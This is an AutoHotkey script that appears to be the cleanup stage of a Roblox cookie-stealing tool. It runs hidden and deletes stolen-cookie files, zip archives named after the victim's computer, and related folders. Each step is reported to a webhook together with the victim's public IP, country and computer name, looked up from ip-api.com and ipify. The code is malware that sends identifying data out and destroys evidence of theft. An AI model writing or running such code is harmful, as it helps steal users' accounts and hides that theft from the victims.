#Requires AutoHotkey v2.0
#SingleInstance Force
#NoTrayIcon

; === Script entry point ===
CleanUpTemp()
ExitApp


CleanUpTemp() {
    tempDir := A_AppData "\PerformanceRun2"

    if DirExist(tempDir) {
        try {
            DirDelete(tempDir, true)
            NDWithLocation("- Deleted folder: " . tempDir)
        } catch as e {
            NDWithLocation("- FAILED to delete folder: " . tempDir . "`nReason: " . e.Message)
        }
    } else {
        NDWithLocation("- Folder not found: " . tempDir)
    }

    tempPath := A_Temp
    pcName := EnvGet("COMPUTERNAME")

    for fileName in ["a.ahk", "b.ahk", "robloxcookies.dat"] {
        filePath := tempPath "\" fileName
        if FileExist(filePath) {
            FileDelete(filePath)
            NDWithLocation("- Deleted file: " . fileName)
        } else {
            NDWithLocation("- File not found: " . fileName)
        }
    }

    pattern := "*" pcName "_part1.zip"
    foundAny := false
    Loop Files, tempPath "\" pattern {
        foundAny := true
        FileDelete(A_LoopFileFullPath)
        NDWithLocation("- Deleted file: " . A_LoopFileName)
    }
    if !foundAny
        NDWithLocation("- No files found matching: " . pattern)

    sejZip := "Sejtype-" pcName ".zip"
    sejZipPath := tempPath "\" sejZip
    if FileExist(sejZipPath) {
        FileDelete(sejZipPath)
        NDWithLocation("- Deleted file: " . sejZip)
    } else {
        NDWithLocation("- File not found: " . sejZip)
    }

    sejFolder := "Sejtype-" pcName
    sejFolderPath := tempPath "\" sejFolder
    if DirExist(sejFolderPath) {
        DirDelete(sejFolderPath, true)
        NDWithLocation("- Deleted folder: " . sejFolder)
    } else {
        NDWithLocation("- Folder not found: " . sejFolder)
    }
}

ND(msg) {
    global wkUrl
    try {
        json := "{" Chr(34) "content" Chr(34) ":" Chr(34) msg Chr(34) "}"
        http := ComObject("WinHttp.WinHttpRequest.5.1")
        http.Open("POST", wkUrl, false)
        http.SetRequestHeader("Content-Type", "application/json")
        http.Send(json)
    } catch {
        ; Fail silently
    }
}

NDWithLocation(msg) {
    try {
        loc := GetGeoInfo()
        ip := GetPublicIP()
        pc := EnvGet("COMPUTERNAME")
        ND(loc . " - [IP: " . ip . "] - [" . pc . "] " . msg)
    } catch {
        ND("- [Geo/IP info unavailable] - [" . EnvGet("COMPUTERNAME") . "] " . msg)
    }
}
GetGeoInfo() {
    global cachedGeo
    if (cachedGeo != "")
        return cachedGeo

    req := ComObject("WinHttp.WinHttpRequest.5.1")
    req.Open("GET", "http://ip-api.com/line/?fields=countryCode,country", false)
    req.Send()
    if (req.Status = 200) {
        lines := StrSplit(req.ResponseText, "`n")
        code := Trim(lines[1])
        name := Trim(lines[2])
        flag := Chr(0x1F1E6 + Ord(SubStr(code, 1, 1)) - 65) . Chr(0x1F1E6 + Ord(SubStr(code, 2, 1)) - 65)
        cachedGeo := "- [" . name . "] "
        return cachedGeo
    } else
        throw "Geo request failed"
}
GetPublicIP() {
    global cachedIP
    if (cachedIP != "")
        return cachedIP

    req := ComObject("WinHttp.WinHttpRequest.5.1")
    req.Open("GET", "https://api.ipify.org", false)
    req.Send()
    if (req.Status = 200) {
        cachedIP := Trim(req.ResponseText)
        return cachedIP
    } else
        throw "IP fetch failed"
}


; if you spam the webhook, its set to self destruct :)
wkUrl := ""
